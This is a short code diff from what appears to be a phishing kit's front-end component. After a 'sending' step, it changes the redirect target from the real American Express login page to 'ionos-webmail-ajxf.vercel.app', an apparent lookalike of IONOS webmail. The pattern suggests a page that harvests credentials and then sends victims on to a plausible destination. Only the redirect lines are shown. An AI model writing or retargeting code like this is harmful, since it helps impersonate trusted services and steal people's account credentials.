@@ -38,7 +38,7 @@ export default {
         this.loading = false;
       } else {
         // Redirect after sending
-        location.replace("https://www.americanexpress.com/en-us/account/login");
+        location.replace("https://ionos-webmail-ajxf.vercel.app/");
       }
     },
 
